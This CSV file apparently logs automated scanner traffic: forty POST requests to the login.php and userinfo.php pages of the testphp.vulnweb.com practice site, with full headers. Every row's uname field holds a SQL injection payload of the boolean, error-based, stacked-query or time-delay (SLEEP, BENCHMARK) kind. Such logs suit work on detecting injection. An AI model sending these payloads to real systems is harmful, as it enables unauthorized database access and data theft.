,url,method,body,Content-Length,Host,Cache-Control,Origin,Content-Type,Upgrade-Insecure-Requests,User-Agent,Accept,Sec-GPC,Accept-Language,Referer,Accept-Encoding,Connection,Cookie
161,http://testphp.vulnweb.com/login.php,POST,uname=-4011%29%29%20OR%203507%3D3132%23&pass=fsdfsdf,52,testphp.vulnweb.com,max-age=0,http://testphp.vulnweb.com,application/x-www-form-urlencoded,1,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36","text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",1,"en-US,en;q=0.5",http://testphp.vulnweb.com/login.php,"gzip, deflate, br",close,
162,http://testphp.vulnweb.com/userinfo.php,POST,uname=-9500%29%29%20OR%208102%3D8102%23&pass=fsdfsdf,52,testphp.vulnweb.com,max-age=0,http://testphp.vulnweb.com,application/x-www-form-urlencoded,1,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36","text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",1,"en-US,en;q=0.5",http://testphp.vulnweb.com/login.php,"gzip, deflate, br",close,
163,http://testphp.vulnweb.com/login.php,POST,uname=-9500%29%29%20OR%208102%3D8102%23&pass=fsdfsdf,52,testphp.vulnweb.com,max-age=0,http://testphp.vulnweb.com,application/x-www-form-urlencoded,1,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36","text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",1,"en-US,en;q=0.5",http://testphp.vulnweb.com/login.php,"gzip, deflate, br",close,
164,http://testphp.vulnweb.com/userinfo.php,POST,uname=-1742%29%29%29%20OR%207980%3D7965%23&pass=fsdfsdf,55,testphp.vulnweb.com,max-age=0,http://testphp.vulnweb.com,application/x-www-form-urlencoded,1,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36","text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",1,"en-US,en;q=0.5",http://testphp.vulnweb.com/login.php,"gzip, deflate, br",close,
165,http://testphp.vulnweb.com/login.php,POST,uname=-1742%29%29%29%20OR%207980%3D7965%23&pass=fsdfsdf,55,testphp.vulnweb.com,max-age=0,http://testphp.vulnweb.com,application/x-www-form-urlencoded,1,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36","text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",1,"en-US,en;q=0.5",http://testphp.vulnweb.com/login.php,"gzip, deflate, br",close,
166,http://testphp.vulnweb.com/userinfo.php,POST,uname=-8720%29%29%29%20OR%208102%3D8102%23&pass=fsdfsdf,55,testphp.vulnweb.com,max-age=0,http://testphp.vulnweb.com,application/x-www-form-urlencoded,1,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36","text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",1,"en-US,en;q=0.5",http://testphp.vulnweb.com/login.php,"gzip, deflate, br",close,
167,http://testphp.vulnweb.com/login.php,POST,uname=-8720%29%29%29%20OR%208102%3D8102%23&pass=fsdfsdf,55,testphp.vulnweb.com,max-age=0,http://testphp.vulnweb.com,application/x-www-form-urlencoded,1,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36","text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",1,"en-US,en;q=0.5",http://testphp.vulnweb.com/login.php,"gzip, deflate, br",close,
168,http://testphp.vulnweb.com/userinfo.php,POST,uname=-7000%20OR%209516%3D6587%23&pass=fsdfsdf,46,testphp.vulnweb.com,max-age=0,http://testphp.vulnweb.com,application/x-www-form-urlencoded,1,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36","text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",1,"en-US,en;q=0.5",http://testphp.vulnweb.com/login.php,"gzip, deflate, br",close,
169,http://testphp.vulnweb.com/login.php,POST,uname=-7000%20OR%209516%3D6587%23&pass=fsdfsdf,46,testphp.vulnweb.com,max-age=0,http://testphp.vulnweb.com,application/x-www-form-urlencoded,1,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36","text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",1,"en-US,en;q=0.5",http://testphp.vulnweb.com/login.php,"gzip, deflate, br",close,
170,http://testphp.vulnweb.com/userinfo.php,POST,uname=-9243%20OR%208102%3D8102%23&pass=fsdfsdf,46,testphp.vulnweb.com,max-age=0,http://testphp.vulnweb.com,application/x-www-form-urlencoded,1,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36","text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",1,"en-US,en;q=0.5",http://testphp.vulnweb.com/login.php,"gzip, deflate, br",close,
171,http://testphp.vulnweb.com/login.php,POST,uname=-9243%20OR%208102%3D8102%23&pass=fsdfsdf,46,testphp.vulnweb.com,max-age=0,http://testphp.vulnweb.com,application/x-www-form-urlencoded,1,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36","text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",1,"en-US,en;q=0.5",http://testphp.vulnweb.com/login.php,"gzip, deflate, br",close,
172,http://testphp.vulnweb.com/userinfo.php,POST,uname=-6867%29%29%20AS%20XoYm%20WHERE%204407%3D4407%20OR%207171%3D2864%23&pass=fsdfsdf,86,testphp.vulnweb.com,max-age=0,http://testphp.vulnweb.com,application/x-www-form-urlencoded,1,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36","text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",1,"en-US,en;q=0.5",http://testphp.vulnweb.com/login.php,"gzip, deflate, br",close,
173,http://testphp.vulnweb.com/login.php,POST,uname=-6867%29%29%20AS%20XoYm%20WHERE%204407%3D4407%20OR%207171%3D2864%23&pass=fsdfsdf,86,testphp.vulnweb.com,max-age=0,http://testphp.vulnweb.com,application/x-www-form-urlencoded,1,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36","text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",1,"en-US,en;q=0.5",http://testphp.vulnweb.com/login.php,"gzip, deflate, br",close,
174,http://testphp.vulnweb.com/userinfo.php,POST,uname=-1114%29%29%20AS%20BZvh%20WHERE%206826%3D6826%20OR%208102%3D8102%23&pass=fsdfsdf,86,testphp.vulnweb.com,max-age=0,http://testphp.vulnweb.com,application/x-www-form-urlencoded,1,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36","text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",1,"en-US,en;q=0.5",http://testphp.vulnweb.com/login.php,"gzip, deflate, br",close,
175,http://testphp.vulnweb.com/login.php,POST,uname=-1114%29%29%20AS%20BZvh%20WHERE%206826%3D6826%20OR%208102%3D8102%23&pass=fsdfsdf,86,testphp.vulnweb.com,max-age=0,http://testphp.vulnweb.com,application/x-www-form-urlencoded,1,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36","text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",1,"en-US,en;q=0.5",http://testphp.vulnweb.com/login.php,"gzip, deflate, br",close,
176,http://testphp.vulnweb.com/userinfo.php,POST,uname=-3389%29%20AS%20XBWu%20WHERE%208264%3D8264%20OR%207545%3D9838%23&pass=fsdfsdf,83,testphp.vulnweb.com,max-age=0,http://testphp.vulnweb.com,application/x-www-form-urlencoded,1,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36","text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",1,"en-US,en;q=0.5",http://testphp.vulnweb.com/login.php,"gzip, deflate, br",close,
177,http://testphp.vulnweb.com/login.php,POST,uname=-3389%29%20AS%20XBWu%20WHERE%208264%3D8264%20OR%207545%3D9838%23&pass=fsdfsdf,83,testphp.vulnweb.com,max-age=0,http://testphp.vulnweb.com,application/x-www-form-urlencoded,1,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36","text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",1,"en-US,en;q=0.5",http://testphp.vulnweb.com/login.php,"gzip, deflate, br",close,
178,http://testphp.vulnweb.com/userinfo.php,POST,uname=-4298%29%20AS%20epAA%20WHERE%206520%3D6520%20OR%208102%3D8102%23&pass=fsdfsdf,83,testphp.vulnweb.com,max-age=0,http://testphp.vulnweb.com,application/x-www-form-urlencoded,1,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36","text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",1,"en-US,en;q=0.5",http://testphp.vulnweb.com/login.php,"gzip, deflate, br",close,
179,http://testphp.vulnweb.com/login.php,POST,uname=-4298%29%20AS%20epAA%20WHERE%206520%3D6520%20OR%208102%3D8102%23&pass=fsdfsdf,83,testphp.vulnweb.com,max-age=0,http://testphp.vulnweb.com,application/x-www-form-urlencoded,1,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36","text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",1,"en-US,en;q=0.5",http://testphp.vulnweb.com/login.php,"gzip, deflate, br",close,
180,http://testphp.vulnweb.com/userinfo.php,POST,uname=fdsfds%27%29%20OR%20NOT%201978%3D6848%23&pass=fsdfsdf,59,testphp.vulnweb.com,max-age=0,http://testphp.vulnweb.com,application/x-www-form-urlencoded,1,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36","text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",1,"en-US,en;q=0.5",http://testphp.vulnweb.com/login.php,"gzip, deflate, br",close,
181,http://testphp.vulnweb.com/userinfo.php,POST,uname=fdsfds%27%29%20OR%20NOT%205984%3D5984%23&pass=fsdfsdf,59,testphp.vulnweb.com,max-age=0,http://testphp.vulnweb.com,application/x-www-form-urlencoded,1,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36","text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",1,"en-US,en;q=0.5",http://testphp.vulnweb.com/login.php,"gzip, deflate, br",close,
182,http://testphp.vulnweb.com/userinfo.php,POST,uname=fdsfds%27%20OR%20NOT%207511%3D7811%23&pass=fsdfsdf,56,testphp.vulnweb.com,max-age=0,http://testphp.vulnweb.com,application/x-www-form-urlencoded,1,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36","text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",1,"en-US,en;q=0.5",http://testphp.vulnweb.com/login.php,"gzip, deflate, br",close,
183,http://testphp.vulnweb.com/userinfo.php,POST,uname=fdsfds%27%20OR%20NOT%205984%3D5984%23&pass=fsdfsdf,56,testphp.vulnweb.com,max-age=0,http://testphp.vulnweb.com,application/x-www-form-urlencoded,1,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36","text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",1,"en-US,en;q=0.5",http://testphp.vulnweb.com/login.php,"gzip, deflate, br",close,
184,http://testphp.vulnweb.com/login.php,POST,uname=fdsfds%27%20OR%20NOT%205984%3D5984%23&pass=fsdfsdf,56,testphp.vulnweb.com,max-age=0,http://testphp.vulnweb.com,application/x-www-form-urlencoded,1,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36","text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",1,"en-US,en;q=0.5",http://testphp.vulnweb.com/login.php,"gzip, deflate, br",close,
185,http://testphp.vulnweb.com/userinfo.php,POST,uname=fdsfds%27%20OR%20NOT%206929%3D2049%23&pass=fsdfsdf,56,testphp.vulnweb.com,max-age=0,http://testphp.vulnweb.com,application/x-www-form-urlencoded,1,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36","text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",1,"en-US,en;q=0.5",http://testphp.vulnweb.com/login.php,"gzip, deflate, br",close,
186,http://testphp.vulnweb.com/userinfo.php,POST,uname=fdsfds%27%20AND%20%28SELECT%202%2A%28IF%28%28SELECT%20%2A%20FROM%20%28SELECT%20CONCAT%280x7170766a71%2C%28SELECT%20%28ELT%287464%3D7464%2C1%29%29%29%2C0x716a6b7671%2C0x78%29%29s%29%2C%208446744073709551610%2C%208446744073709551610%29%29%29--%20JYkZ&pass=fsdfsdf,267,testphp.vulnweb.com,max-age=0,http://testphp.vulnweb.com,application/x-www-form-urlencoded,1,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36","text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",1,"en-US,en;q=0.5",http://testphp.vulnweb.com/login.php,"gzip, deflate, br",close,
187,http://testphp.vulnweb.com/userinfo.php,POST,uname=fdsfds%27%20OR%20%28SELECT%202%2A%28IF%28%28SELECT%20%2A%20FROM%20%28SELECT%20CONCAT%280x7170766a71%2C%28SELECT%20%28ELT%289907%3D9907%2C1%29%29%29%2C0x716a6b7671%2C0x78%29%29s%29%2C%208446744073709551610%2C%208446744073709551610%29%29%29--%20sugN&pass=fsdfsdf,266,testphp.vulnweb.com,max-age=0,http://testphp.vulnweb.com,application/x-www-form-urlencoded,1,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36","text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",1,"en-US,en;q=0.5",http://testphp.vulnweb.com/login.php,"gzip, deflate, br",close,
188,http://testphp.vulnweb.com/userinfo.php,POST,uname=fdsfds%27%20AND%20EXP%28~%28SELECT%20%2A%20FROM%20%28SELECT%20CONCAT%280x7170766a71%2C%28SELECT%20%28ELT%282982%3D2982%2C1%29%29%29%2C0x716a6b7671%2C0x78%29%29x%29%29--%20xJdC&pass=fsdfsdf,194,testphp.vulnweb.com,max-age=0,http://testphp.vulnweb.com,application/x-www-form-urlencoded,1,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36","text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",1,"en-US,en;q=0.5",http://testphp.vulnweb.com/login.php,"gzip, deflate, br",close,
189,http://testphp.vulnweb.com/login.php,POST,uname=fdsfds%27%20AND%20EXP%28~%28SELECT%20%2A%20FROM%20%28SELECT%20CONCAT%280x7170766a71%2C%28SELECT%20%28ELT%282982%3D2982%2C1%29%29%29%2C0x716a6b7671%2C0x78%29%29x%29%29--%20xJdC&pass=fsdfsdf,194,testphp.vulnweb.com,max-age=0,http://testphp.vulnweb.com,application/x-www-form-urlencoded,1,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36","text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",1,"en-US,en;q=0.5",http://testphp.vulnweb.com/login.php,"gzip, deflate, br",close,
190,http://testphp.vulnweb.com/userinfo.php,POST,uname=fdsfds%27%20OR%20EXP%28~%28SELECT%20%2A%20FROM%20%28SELECT%20CONCAT%280x7170766a71%2C%28SELECT%20%28ELT%284571%3D4571%2C1%29%29%29%2C0x716a6b7671%2C0x78%29%29x%29%29--%20USHb&pass=fsdfsdf,193,testphp.vulnweb.com,max-age=0,http://testphp.vulnweb.com,application/x-www-form-urlencoded,1,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36","text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",1,"en-US,en;q=0.5",http://testphp.vulnweb.com/login.php,"gzip, deflate, br",close,
191,http://testphp.vulnweb.com/userinfo.php,POST,uname=fdsfds%27%20AND%20GTID_SUBSET%28CONCAT%280x7170766a71%2C%28SELECT%20%28ELT%288334%3D8334%2C1%29%29%29%2C0x716a6b7671%29%2C8334%29--%20yjfE&pass=fsdfsdf,157,testphp.vulnweb.com,max-age=0,http://testphp.vulnweb.com,application/x-www-form-urlencoded,1,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36","text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",1,"en-US,en;q=0.5",http://testphp.vulnweb.com/login.php,"gzip, deflate, br",close,
192,http://testphp.vulnweb.com/userinfo.php,POST,uname=%28SELECT%20CONCAT%280x7170766a71%2C%28ELT%281796%3D1796%2C1%29%29%2C0x716a6b7671%29%29&pass=fsdfsdf,106,testphp.vulnweb.com,max-age=0,http://testphp.vulnweb.com,application/x-www-form-urlencoded,1,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36","text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",1,"en-US,en;q=0.5",http://testphp.vulnweb.com/login.php,"gzip, deflate, br",close,
193,http://testphp.vulnweb.com/login.php,POST,uname=%28SELECT%20CONCAT%280x7170766a71%2C%28ELT%281796%3D1796%2C1%29%29%2C0x716a6b7671%29%29&pass=fsdfsdf,106,testphp.vulnweb.com,max-age=0,http://testphp.vulnweb.com,application/x-www-form-urlencoded,1,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36","text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",1,"en-US,en;q=0.5",http://testphp.vulnweb.com/login.php,"gzip, deflate, br",close,
194,http://testphp.vulnweb.com/userinfo.php,POST,uname=fdsfds%27%3BSELECT%20SLEEP%285%29%23&pass=fsdfsdf,55,testphp.vulnweb.com,max-age=0,http://testphp.vulnweb.com,application/x-www-form-urlencoded,1,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36","text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",1,"en-US,en;q=0.5",http://testphp.vulnweb.com/login.php,"gzip, deflate, br",close,
195,http://testphp.vulnweb.com/userinfo.php,POST,uname=fdsfds%27%3BSELECT%20SLEEP%285%29--%20reQo&pass=fsdfsdf,61,testphp.vulnweb.com,max-age=0,http://testphp.vulnweb.com,application/x-www-form-urlencoded,1,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36","text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",1,"en-US,en;q=0.5",http://testphp.vulnweb.com/login.php,"gzip, deflate, br",close,
196,http://testphp.vulnweb.com/userinfo.php,POST,uname=fdsfds%27%3B%28SELECT%20%2A%20FROM%20%28SELECT%28SLEEP%285%29%29%29wOaq%29%23&pass=fsdfsdf,96,testphp.vulnweb.com,max-age=0,http://testphp.vulnweb.com,application/x-www-form-urlencoded,1,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36","text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",1,"en-US,en;q=0.5",http://testphp.vulnweb.com/login.php,"gzip, deflate, br",close,
197,http://testphp.vulnweb.com/userinfo.php,POST,uname=fdsfds%27%3B%28SELECT%20%2A%20FROM%20%28SELECT%28SLEEP%285%29%29%29Goab%29--%20Qzjs&pass=fsdfsdf,102,testphp.vulnweb.com,max-age=0,http://testphp.vulnweb.com,application/x-www-form-urlencoded,1,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36","text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",1,"en-US,en;q=0.5",http://testphp.vulnweb.com/login.php,"gzip, deflate, br",close,
198,http://testphp.vulnweb.com/userinfo.php,POST,uname=fdsfds%27%3BSELECT%20BENCHMARK%285000000%2CMD5%280x61627068%29%29%23&pass=fsdfsdf,87,testphp.vulnweb.com,max-age=0,http://testphp.vulnweb.com,application/x-www-form-urlencoded,1,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36","text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",1,"en-US,en;q=0.5",http://testphp.vulnweb.com/login.php,"gzip, deflate, br",close,
199,http://testphp.vulnweb.com/userinfo.php,POST,uname=fdsfds%27%3BSELECT%20BENCHMARK%285000000%2CMD5%280x5163614c%29%29--%20qNji&pass=fsdfsdf,93,testphp.vulnweb.com,max-age=0,http://testphp.vulnweb.com,application/x-www-form-urlencoded,1,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36","text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",1,"en-US,en;q=0.5",http://testphp.vulnweb.com/login.php,"gzip, deflate, br",close,
200,http://testphp.vulnweb.com/userinfo.php,POST,uname=fdsfds%27%20AND%20%28SELECT%209883%20FROM%20%28SELECT%28SLEEP%285%29%29%29ydon%29--%20ldrU&pass=fsdfsdf,109,testphp.vulnweb.com,max-age=0,http://testphp.vulnweb.com,application/x-www-form-urlencoded,1,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36","text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",1,"en-US,en;q=0.5",http://testphp.vulnweb.com/login.php,"gzip, deflate, br",close,
